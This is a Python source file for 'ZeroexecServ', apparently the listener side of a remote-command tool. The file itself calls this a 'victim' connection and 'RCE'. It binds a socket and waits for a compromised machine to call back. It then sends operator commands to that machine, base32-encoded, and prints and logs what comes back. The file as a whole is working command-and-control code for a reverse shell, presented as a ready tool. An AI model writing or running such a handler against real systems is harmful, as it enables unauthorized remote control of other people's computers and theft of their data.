import socket 
import base64
import io, subprocess as sp
from datetime import datetime
from sys import stdout
import sys
from .custom_banner import tagline
from .ansicolors import *
import shutil, time

class ZeroexecServ:
    def __init__(self):
        sp.run(["clear"])
        self.__ctime=datetime.now().strftime("%H:%M")
        self.__cyear=datetime.now().strftime("%Y:%m:%d")
        stdout.encoding.strip(tagline())
        self.listentimeout=60

    def capture_victim(self, host: str, port: int):
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind((host, port))
            s.listen(1)
            s.settimeout(self.listentimeout)
            print(f"{BG_RED} [INITIATE]::LISTENING ON {host} {RESET} \n"
                  .center(shutil.get_terminal_size().columns+10))
            conn, addr = s.accept()
            print(f"{BG_GREEN} {BLACK}[COMPLETE]::INITIALIZED OK {RESET} "
                  .center(shutil.get_terminal_size().columns+14))
            return (conn, addr)

    def rce_connection(self, options, host: str, port: int):
        try:
            sessions=[]
            conn, addr = self.capture_victim(host, port)
            sessions.append(addr)
            while True:
                self.cmd=input(f"\n{BOLD}{SOFT_GREEN}[{addr[0]}]>>> {RESET}").strip()
                conn.send(base64.b32hexencode(self.cmd.encode()))
                recvdata = conn.recv(1024*1024).decode() 
                print(f"{WHITE}{ITALIC}{recvdata}{RESET}")
                if options.write_logs:
                    self.write_logs(
                        recvdata,
                        self.__ctime,
                        self.__cyear
                    )
                if self.cmd in ["quit", "exit"]:
                    if options.write_logs:
                        print(f"{CYAN}[INFO]: File saved - {self.filename}{RESET}")
                    conn.close()
                    break
                if self.cmd in ["banner"]:
                    stdout.encoding.strip(tagline())
            conn.close()
        except KeyboardInterrupt:
            print(f"{BRIGHT_RED}[INFO]: RCE is stopped.{RESET}")
        except OSError as e:
            print(f"{PASTEL_BLUE}[INFO]: {e} {RESET} ")

    def write_logs(self, data: str, time: str, year: str):
        self.filename=f"./sessionlogs/trace-{time}#{year}.log"
        logfile=io.open(self.filename, "a+")
        logtext=f"Command: {self.cmd}\n{data}\n\n"
        logfile.write(logtext)
        logfile.close()

